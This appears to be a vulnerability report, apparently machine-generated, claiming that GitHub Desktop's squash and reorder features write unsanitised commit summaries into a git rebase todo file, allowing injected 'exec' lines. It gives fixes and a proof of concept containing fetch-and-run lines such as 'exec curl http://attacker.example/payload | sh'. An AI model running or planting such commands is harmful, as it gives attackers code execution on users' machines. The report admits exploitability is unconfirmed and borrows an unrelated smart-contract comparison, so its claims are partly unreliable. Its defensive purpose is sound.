## Title
Attacker-controlled commit summary can inject arbitrary `exec` lines into the interactive-rebase todo file used by Squash/Reorder — ([File: app/src/lib/git/squash.ts], [File: app/src/lib/git/reorder.ts])

## Summary
`squash.ts` and `reorder.ts` build a Git interactive-rebase "todo" file by string-concatenating the raw, git-log-derived `commit.summary` value directly into `pick <sha> <summary>\n` / `squash <sha> <summary>\n` lines, then hand that file to `git rebase -i` via a `cat`-based sequence editor. `commit.summary` is populated straight from `git log --format=...%s...` output, parsed with a delimiter-based, no-sanitization parser [1](#0-0) , and used unescaped when appending todo lines [2](#0-1) [3](#0-2) . This mirrors the C4 report's root cause: privileged/derived state (`plotsMinted`/token ids ⇔ here, the rebase todo control file) is built from attacker-influenced input without validating that the injected value cannot collide with, or be interpreted as, additional control data.

## Finding Description
`getCommits()` extracts `summary` using `%s` in a `-z`/NUL-delimited custom format string, then simply slices the buffer with no further sanitization of embedded control/line-break characters [4](#0-3) . This value ends up as `Commit.summary`, a plain string with no guarantee that it contains no `\n`.

`squash()` and `reorder()` then write this attacker-controlled string directly into a todo file consumed by `git rebase --interactive`:
```
await appendFile(todoPath, `pick ${commit.sha} ${commit.summary}\n`)
...
await appendFile(todoPath, `squash ${commit.sha} ${commit.summary}\n`)
``` [5](#0-4) [6](#0-5) 

The generated file is fed to `rebaseInteractive`, which sets `GIT_SEQUENCE_EDITOR` to `cat <todoPath> >` so that whatever content is in `todoPath` becomes the actual rebase todo list executed by Git [7](#0-6) . Interactive-rebase todo files support an `exec <shell-command>` line, which Git will run with the user's shell during the rebase.

If a commit's first-line "subject" as reported by `%s` can contain a literal newline (or a Unicode line-separator such as U+2028/U+2029, which many terminals/parsers treat as a line break but which is not stripped by Git's `%s` handling), an attacker who authors a commit in a repository the victim later clones/fetches/checks out (e.g., a malicious fork, PR branch, or upstream commit) can craft a commit message whose "single line" summary actually smuggles a second line such as:
```
exec curl http://evil/x | sh
```
When the victim uses Desktop's Squash or Reorder feature on history containing that commit, Desktop writes this attacker-supplied line straight into the interactive-rebase todo file, and Git will execute it as an `exec` step of the rebase — with no confirmation, no diff review, and no indication in the UI that a shell command is about to run.

## Impact Explanation
This directly satisfies the "unprivileged … result is code execution" criterion: the attacker only needs to control commit content in a repository the victim opens/clones and later squashes/reorders. Successful exploitation is a full desktop shell command execution in the user's environment (same class of impact as a supply-chain RCE), which is categorically more severe than the original finding's DoS/bricking — this is the escalated Desktop analog of "state corrupted by attacker-influenced data bypasses the app's guards to trigger an unintended, damaging Git operation."

## Likelihood Explanation
Requires the victim to: (1) have the malicious commit in their local history (via clone/fetch/checkout of an attacker's branch/fork/PR — all realistic, unprivileged actions supported by Desktop's existing "Open in Desktop" / clone / PR checkout flows), and (2) invoke Squash or Reorder on a range of commits that includes it — both of which are common, everyday actions for a git client. No malware, no local/physical/admin access, and no social engineering beyond "review this branch/PR" is required. The only uncertain factor is whether git's `%s` placeholder can literally carry a raw newline/line-separator character through to Desktop's parser in all supported Git versions; I was not able to fully confirm this specific behavior of `%s` from the codebase alone (this is a property of the installed Git binary, not of Desktop's code), so likelihood should be validated empirically before treating this as confirmed-exploitable rather than a hardening gap.

## Recommendation
- Sanitize/reject any control characters (`\n`, `\r`, U+2028, U+2029, NUL) from `commit.summary` (and any other commit-derived text, e.g. PR titles) before writing it into any generated Git control file (`squashTodo`, `reorderTodo`, commit-message files).
- Prefer writing todo entries using an established Git-safe encoding, or omit the human-readable summary from the appended file altogether (Git only requires the `<command> <sha>` prefix to be well formed; the summary is only a comment for humans and is not needed for correctness).
- Add a regression test asserting that a commit whose summary contains an embedded newline/line-separator cannot introduce additional todo lines (e.g., `exec`) into the generated file.

## Proof of Concept
1. In a repository, create a commit whose message's first paragraph is engineered to make `git log --format=%s` emit multiple lines (e.g., using a Unicode line separator U+2028 instead of `\n` inside the subject, or exploiting any Git version/config where `%s` does not collapse internal newlines) containing:
   ```
   exec curl http://attacker.example/payload | sh
   ```
2. Victim clones/fetches this repository or checks out a PR/branch containing the commit in GitHub Desktop.
3. Victim selects a commit range including the malicious commit and invokes "Squash" or "Reorder" from the History view (`onSquash`/`onKeyboardReorder` in `app/src/ui/history/compare.tsx`), which calls `dispatcher.squash`/reorder down to `squash()`/`reorder()`.
4. `squash()`/`reorder()` appends `pick/squash <sha> <summary>` lines to `todoPath`, where `<summary>` contains the smuggled `exec ...` line [8](#0-7) .
5. `rebaseInteractive()` invokes `git rebase --interactive` with `GIT_SEQUENCE_EDITOR` set to replace the todo with the attacker-influenced file content [7](#0-6) ; Git executes the injected `exec` line as a shell command during the rebase.

export function createLogParser<T extends Record<string, string>>(fields: T) {
  const keys: Array<keyof T> = Object.keys(fields)
  const format = Object.values(fields).join('%x00')
  const formatArgs = ['-z', `--format=${format}`]

  const parse = <V extends string | Buffer>(value: V) => {
    const records = (
      Buffer.isBuffer(value) ? splitBuffer(value, '\0') : value.split('\0')
    ) as V[]
    const entries = []

    for (let i = 0; i < records.length - keys.length; i += keys.length) {
      const entry = {} as { [K in keyof T]: V }
      keys.forEach((key, ix) => (entry[key] = records[i + ix]))
      entries.push(entry)
    }

    return entries
  }

export async function getCommits(
  repository: Repository,
  revisionRange?: string,
  limit?: number,
  skip?: number,
  additionalArgs: ReadonlyArray<string> = []
): Promise<ReadonlyArray<Commit>> {
  const { formatArgs, parse } = createLogParser({
    sha: '%H', // SHA
    shortSha: '%h', // short SHA
    summary: '%s', // summary
    body: '%b', // body
    // author identity string, matching format of GIT_AUTHOR_IDENT.
    //   author name <author email> <author date>
    // author date format dependent on --date arg, should be raw
    author: '%an <%ae> %ad',
    committer: '%cn <%ce> %cd',
    parents: '%P', // parent SHAs,
    trailers: '%(trailers:unfold,only)',
    refs: '%D',
  })

  const args = ['log']

  if (revisionRange !== undefined) {
    args.push(revisionRange)
  }

  args.push('--date=raw')

  if (limit !== undefined) {
    args.push(`--max-count=${limit}`)
  }

  if (skip !== undefined) {
    args.push(`--skip=${skip}`)
  }

  args.push(
    ...formatArgs,
    '--no-show-signature',
    '--no-color',
    ...additionalArgs,
    '--'
  )
  const result = await git(args, repository.path, 'getCommits', {
    successExitCodes: new Set([0, 128]),
    encoding: 'buffer',
  })

  // if the repository has an unborn HEAD, return an empty history of commits
  if (result.exitCode === 128) {
    return new Array<Commit>()
  }

  const parsed = parse(result.stdout)

  return parsed.map(commit => {
    // Ref is of the format: (HEAD -> master, tag: some-tag-name, tag: some-other-tag,with-a-comma, origin/master, origin/HEAD)
    // Refs are comma separated, but some like tags can also contain commas in the name, so we split on the pattern ", " and then
    // check each ref for the tag prefix. We used to use the regex /tag: ([^\s,]+)/g)`, but will clip a tag with a comma short.
    const tags = commit.refs
      .toString()
      .split(', ')
      .flatMap(ref => (ref.startsWith('tag: ') ? ref.substring(5) : []))

    return new Commit(
      commit.sha.toString(),
      commit.shortSha.toString(),
      commit.summary.subarray(0, 100 * 1024).toString(),
      commit.body.subarray(0, 100 * 1024).toString(),
      CommitIdentity.parseIdentity(commit.author.toString()),
      CommitIdentity.parseIdentity(commit.committer.toString()),
      commit.parents.length > 0 ? commit.parents.toString().split(' ') : [],
      // We know for sure that the trailer separator will be ':' since we got
      // them from %(trailers:unfold) above, see `git help log`:
      //
      //   "key_value_separator=<SEP>: specify a separator inserted between
      //    trailer lines. When this option is not given each trailer key-value
      //    pair is separated by ": ". Otherwise it shares the same semantics as
      //    separator=<SEP> above."
      parseRawUnfoldedTrailers(commit.trailers.toString(), ':'),
      tags
    )
  })
